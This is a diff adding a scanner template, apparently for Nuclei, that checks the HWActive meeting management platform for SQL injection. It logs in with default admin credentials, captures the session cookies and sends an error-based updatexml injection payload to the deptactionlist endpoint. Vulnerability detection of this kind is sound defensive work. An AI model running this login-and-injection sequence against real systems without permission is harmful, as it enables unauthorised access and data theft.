@@ -1,0 +1,56 @@
+id: poc-yaml-hwactive-deptactionlist-sqli
+info:
+  name: 华望云会议管理平台 deptactionlist SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    This template checks for a SQL injection vulnerability in the 华望云会议管理平台 (HWActive Meeting Management Platform) via the deptactionlist endpoint.
+http:
+  - raw:
+      - |
+        POST /ajax/userlogin HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+        userNameCopy=admin&userName=admin&passWordCopy=admin&passWord=21232f297a57a5a743894a0e4a801fc3
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '"success":true'
+    extractors:
+      - type: regex
+        name: uid
+        part: header
+        internal: true
+        group: 1
+        regex:
+          - "uid=(.*?);"
+      - type: regex
+        name: jsessionid
+        part: header
+        internal: true
+        group: 1
+        regex:
+          - "JSESSIONID=(.*?);"
+  - raw:
+      - |
+        GET /page/deptactionlist?search=1%25'+and+1%3d(updatexml(0x7e,concat(1,(select+md5(1))),1))+and+'%25%25'+like+'&dpId=1&params[]=dpName&params[]=dpId HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: uid={{uid}}; JSESSIONID={{jsessionid}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        part: body
+        words:
+          - "XPATH syntax error"
+          - "java.sql.SQLException"
+          - "c4ca4238a0b923820dcc509a6f75849b"
